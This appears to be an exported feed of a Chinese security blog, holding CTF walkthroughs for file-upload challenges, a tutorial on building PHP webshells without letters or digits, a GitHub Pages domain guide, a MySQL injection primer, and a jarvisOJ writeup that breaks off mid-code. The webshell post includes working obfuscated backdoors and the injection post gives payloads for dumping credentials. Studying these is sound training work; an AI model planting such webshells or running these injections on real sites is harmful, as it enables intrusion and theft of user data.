custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">    global $extraBytes, $correctImage;</span><br><span class="line">    $correctImage &#x3D; FALSE;</span><br><span class="line">    if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;</span><br><span class="line">        if(isset($m[1])) &#123;</span><br><span class="line">            $extraBytes &#x3D; (int)$m[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DataInputStream &#123;</span><br><span class="line">    private $binData;</span><br><span class="line">    private $order;</span><br><span class="line">    private $size;</span><br><span class="line"></span><br><span class="line">    public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;</span><br><span class="line">        $this-&gt;binData &#x3D; &#39;&#39;;</span><br><span class="line">        $this-&gt;order &#x3D; $order;</span><br><span class="line">        if(!$fromString) &#123;</span><br><span class="line">            if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);</span><br><span class="line">            $this-&gt;binData &#x3D; file_get_contents($filename);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;binData &#x3D; $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;size &#x3D; strlen($this-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function seek() &#123;</span><br><span class="line">        return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function skip($skip) &#123;</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function readByte() &#123;</span><br><span class="line">        if($this-&gt;eof()) &#123;</span><br><span class="line">            die(&#39;End Of File&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $byte &#x3D; substr($this-&gt;binData, 0, 1);</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);</span><br><span class="line">        return ord($byte);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function readShort() &#123;</span><br><span class="line">        if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">            die(&#39;End Of File&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $short &#x3D; substr($this-&gt;binData, 0, 2);</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);</span><br><span class="line">        if($this-&gt;order) &#123;</span><br><span class="line">            $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $short;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function eof() &#123;</span><br><span class="line">        return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>使用方法：</strong></p><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg，</p><p>使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg</p><p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>考察点：</strong>竞争上传</p><p><strong>通关方法：</strong></p><p>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。<br>首先在burp中不断发送上传webshell的数据包：</p><p>然后不断在浏览器中访问，发现通过竞争可以访问到：</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>考察点：竞争上传+白名单</p><p><strong>通关方法：</strong></p><p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><strong>考察点：</strong>00截断</p><p><strong>通关方法：</strong></p><p>本关考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的</p><p>查看代码，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过：</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><strong>考察点：</strong></p><p><strong>通关方法：</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字webshell</title>
      <link href="2019/10/16/nowords-webshell/"/>
      <url>2019/10/16/nowords-webshell/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了构造无字母数字webshell的一些方法！</p><a id="more"></a><h2 id="一道有意思的题"><a href="#一道有意思的题" class="headerlink" title="一道有意思的题"></a>一道有意思的题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析代码可知只要执行getFlag()函数应该就可以得到flag了</p><p>但对code的长度限制&lt;40,并且code不能有数字和大小写字母</p><h3 id="方式1-异或运算"><a href="#方式1-异或运算" class="headerlink" title="方式1(异或运算)"></a>方式1(异或运算)</h3><p>先解释下异或运算</p><p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p><p><strong>举个例子：</strong></p><pre><code>A的ASCII值是65，对应的二进制值是01000001?的ASCII值是63，对应的二进制值是00111111</code></pre><p>异或的二进制的值是01111110，对应的ASCII值是126，对应的字符串的值就是~了</p><p>我们都知道，PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们一起来分析一下上面这段代码：</p><pre><code>$_++;这行代码的意思是对变量名为&quot;_&quot;的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。$__=&quot;?&quot; ^ &quot;&#125;&quot;;对字符”?”和”&#125;”进行异或运算，得到结果B赋给变量名为”__”(两个下划线)的变量$ __ ();通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为Hello Angel_Kitty。在PHP中，我们可以将字符串当作函数来处理。</code></pre><p>下面是个非常简单的非数字字母的PHP后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>_POST的拼接可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p><pre><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);或者$__=&quot;#./|&#123;&quot;^&quot;|~`//&quot;;</code></pre><p>注意#的url编码，否则会相当于注释</p><p>同样_GET也可以这样拼接</p><pre><code>$__=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;</code></pre><p>按照这种方法，可得payload</p><pre><code>?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag?code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    //$_=&#39;getFlag&#39;?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</code></pre><p>相当于 <code>$啊=getFlag;$啊();</code></p><p>这里就不需要用 <code>&#123;&#125;</code> 了，因为取反的值直接被当作字符串赋值给了 $ 啊</p><h3 id="方式2-取反运算"><a href="#方式2-取反运算" class="headerlink" title="方式2(取反运算)"></a>方式2(取反运算)</h3><p><strong>主要原理：</strong></p><p>利用的是UTF-8编码的某个汉字，将其中某个字符取出来取反</p><p>比如<code>&quot;和&quot;[2]</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p><img src="/2019/10/16/nowords-webshell/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg"></p><p><strong>举个例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);     &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;        &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;a&#39;</span><br><span class="line">$___&#x3D;&quot;和&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);</span><br><span class="line">$___&#x3D;&quot;和&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;as&#39;</span><br><span class="line">$___&#x3D;&quot;的&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;ass&#39;</span><br><span class="line">$___&#x3D;&quot;半&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;asse&#39;</span><br><span class="line">$___&#x3D;&quot;始&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;assert&#39;</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;</span><br><span class="line">$___&#x3D;&quot;俯&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_P&#39;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_PO&#39;</span><br><span class="line">$___&#x3D;&quot;次&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POS&#39;</span><br><span class="line">$___&#x3D;&quot;站&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POST&#39;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;                    &#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><p>这里也有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p><p>那麽利用这种方式可得payload</p><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); //%_为getFlag取反然后URL编码得结果或?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>拼接出了 $_GET<a href>‘+’</a>;，传入 +=getFlag() 从而执行了函数</p><p><strong>注意点：</strong></p><p>php5和php7是有区别的</p><p>PHP7前是不允许用<code>($a)()</code>;这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p><h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><p>升级版增加了对<code>_</code>和<code>$</code>的过滤，但还是有方法绕过的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>这道题刚好是在linux系统上，并且开启了短标签</p><p>在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：</p><pre><code>???/??? =&gt; /bin/cat</code></pre><p>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量<br>于是读源码：</p><pre><code>$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;&quot;/bin/cat /var/www/html/index.php&quot;</code></pre><p>长度超出上限，使用通配：</p><pre><code>$_=/???/???%20/???/???/????/;?&gt;&lt;?=$_?&gt;</code></pre><p>正则过滤了$和_,改进为：</p><pre><code>?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</code></pre><p>可以读到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">    $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接读flag文件</p><pre><code>?&gt;&lt;?=`/???/???%20/????`;?&gt;</code></pre><p>参考：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github博客优化</title>
      <link href="2019/10/16/github-blog-domain/"/>
      <url>2019/10/16/github-blog-domain/</url>
      
        <content type="html"><![CDATA[<p>闲来无事，搞了个域名，试试把买的域名解析到博客上！</p><a id="more"></a><h2 id="github-pages绑定自己的域名"><a href="#github-pages绑定自己的域名" class="headerlink" title="github pages绑定自己的域名"></a>github pages绑定自己的域名</h2><h3 id="修改域名解析"><a href="#修改域名解析" class="headerlink" title="修改域名解析"></a>修改域名解析</h3><p>我是在腾讯云买的域名，阿里云配置也类似</p><p><img src="/2019/10/16/github-blog-domain/20191015223633.png"></p><p>添加主机记录为子域名（不能为全部域名，这里为blog）,记录类型为CNAME,记录值为原博客地址</p><h3 id="修改github项目配置"><a href="#修改github项目配置" class="headerlink" title="修改github项目配置"></a>修改github项目配置</h3><p>找到博客项目，然后Settings，找到Github Pages</p><p><img src="/2019/10/16/github-blog-domain/20191015224428.png"></p><p>将Custom domain设置成自己的域名（没有<code>http://</code>或<code>https://</code>）</p><h3 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h3><p>在博客目录source文件夹里添加CNAME文件</p><p>内容填写为你要设置的域名</p><p>例如我的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blog.moonback.xyz</span><br></pre></td></tr></table></figure><p>然后 <code>hexo g</code> ,<code>hexo d</code>就行了</p><p>可能不会马上解析成功，等段时间就好</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入方法</title>
      <link href="2019/10/16/mysql-injection/"/>
      <url>2019/10/16/mysql-injection/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了mysql注入的一些方法！</p><a id="more"></a><h2 id="可以回显sql错误的注入"><a href="#可以回显sql错误的注入" class="headerlink" title="可以回显sql错误的注入"></a>可以回显sql错误的注入</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><pre><code>必了解的东西：数据库information_schema用来存储其他数据库的信息，包括所有的数据库名称，表名，字段SCHEMATA表：提供了当前mysql实例中所有数据库的信息    字段schemata_name：所有数据库的名称TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息    字段table_schema：所有数据库的名称(重复）  字段table_name:所有表的名称COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。    字段table_schema：所有数据库的名称(重复）  字段table_name:所有表的名称（重复）    字段column_name：所有列的名称</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:？id&#x3D;-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23</span><br></pre></td></tr></table></figure><p>​    解释：<br>​        <code>id=-1</code>                                           是为了让网页回显不了内容，从而让联合查询的结果显示<br>​        <code>%27</code>                                                单引号’的url编码,闭合id的内容<br>​        <code>%20</code>                                                代表空格的url编码<br>​        <code>union</code>                                            联合查询字符<br>​        <code>group_concat()</code>函数                                将查询的结果一行显示<br>​        <code>null,group_concat(schema_name),null</code>                个数取决于网页本身查询的字段个数<br>​        <code>%23</code>                                              #号的url编码，可以用<code>--%20</code>代替，用于注释后面的sql语句</p><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><pre><code>payload:?id=1&#39; order by 3%23判当前页面数据表共有多少列</code></pre><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p><strong>判断回显位</strong></p><pre><code> ?id=-1&#39; union select 1,2,3%23</code></pre></li><li><p><strong>爆数据库</strong></p><pre><code> ?id=-1%27%20union%20select%20null,group_concat(schema_name),null%20from%20information_schema.schemata%23</code></pre></li><li><p><strong>爆表</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database()%23 或 ?id=-1&#39; union select null,group_concat(table_name),null from information_schema.tables where table_schema=&#39;xxxx&#39;%23 xxx为爆出来的数据库名 前两个步骤可以直接写成： ?id=-1&#39; union select null,group_concat(schema_name),(select group_concat(table_name) from information_schema.tables where table_schema=database()) from information_schema.schemata%23</code></pre></li><li><p><strong>爆字段</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;xxx&#39;%23 ?id=-1&#39; union select null,group_concat(column_name),null from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()%23 最好是第二种，对数据库限制，防止不同数据库有相同的表</code></pre></li><li><p><strong>爆内容</strong></p><pre><code> ?id=-1&#39; union select null,group_concat(username,0x23,password),null from security.users where id=2 %23</code></pre></li></ol><h3 id="重点理解"><a href="#重点理解" class="headerlink" title="重点理解"></a>重点理解</h3><pre><code>在不知道如何构造payload,可以先让其报错，根据报错信息分析构造目的：    让传参前面的符号闭合，使后面的联合查询当成sql语句执行</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>什么是盲注呢？</p><p>简单说，当想要得到的数据信息(比如数据库名，表名，字段名等)无法回显到屏幕上，就可以用某些函数对数据进行爆破处理。</p><p>比如想要得到数据库名，就可以用函数截取数据库名的第一个字符，然后爆破，如果第一个字符等于某个字符，就让其执行某些操作（比如，睡3s），不断进行下一个字符的爆破，拼接起来就是数据</p><p>先介绍几个函数</p><p><strong>if函数</strong></p><pre><code>格式：IF(Condition,A,B)含义：如果Condition成立，则A，否则B</code></pre><p><strong>substr函数</strong></p><pre><code>格式：SUBSTR(string,start,len)含义：从string的start位开始截取len个字符</code></pre><p><strong>mid函数</strong></p><pre><code>格式：MID(column_name,start[,length])含义：从column_name中start位开始截取length(可选参数)长度</code></pre><p><strong>ascii函数</strong></p><pre><code>格式：ASCII(char)含义：将char转化成ascii码</code></pre><p><strong>left函数</strong></p><pre><code>格式：LEFT ( string, n )含义：函数得到字符串左部指定个数的字符，string为要截取的字符串，n为长度。</code></pre><p><strong>right函数</strong></p><pre><code>格式：RIGHT( string, n )含义：函数得到字符串右部指定个数的字符，string为要截取的字符串，n为长度。</code></pre><p><strong>length函数</strong></p><pre><code>格式：LENGTH(string)含义：得到string的长度</code></pre><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>基于时间的盲注（延时注入）是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术</p><p>这里基于时间的盲注主要用的就是sleep()函数，根据反应时间来确定是否正确</p><p>一般用下面的模板就可以解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">payload&#x3D; &#39;*** and if(ascii(substr(***,1,1))&#x3D;*,sleep(3),0)%23&#39;</span><br><span class="line">r&#x3D;requests.get(url+payload,timeout&#x3D;3)&#x2F;&#x2F;注意要设置设置timeout</span><br><span class="line">except requests.exceptions.ReadTimeout as e:&#x2F;&#x2F;超时异常</span><br><span class="line">data+&#x3D;chr(j)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p>布尔型盲注和基于时间的盲注最大的区别就是布尔型盲注是根据页面回显内容不同来判断的，而时间盲注不需要在意这一点，只需判断响应时间就行</p><p>一般用下面的模板就可以解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">payload&#x3D; &#39;*** and ascii(substr(***,1,1))&#x3D;*%23&#39;</span><br><span class="line">r&#x3D;requests.get(url+payload)</span><br><span class="line"> if &quot;***&quot; in r.text:</span><br><span class="line">        data+char(j)</span><br><span class="line">except Exceptions as e:</span><br><span class="line">break</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这个好像有点多，单独写一篇博客总结一下：<a href="https://www.moonback.xyz/2019/10/25/mysql-wrong-injection/">https://www.moonback.xyz/2019/10/25/mysql-wrong-injection/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj web部分writeup</title>
      <link href="2019/10/05/jarvisoj-web-wp/"/>
      <url>2019/10/05/jarvisoj-web-wp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了jarvisOJ上web部分题writeup！！！</p><a id="more"></a><h2 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h2><p>打开题目发现提示git搭建的，有没有源码泄露？</p><p>githack跑下，得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking 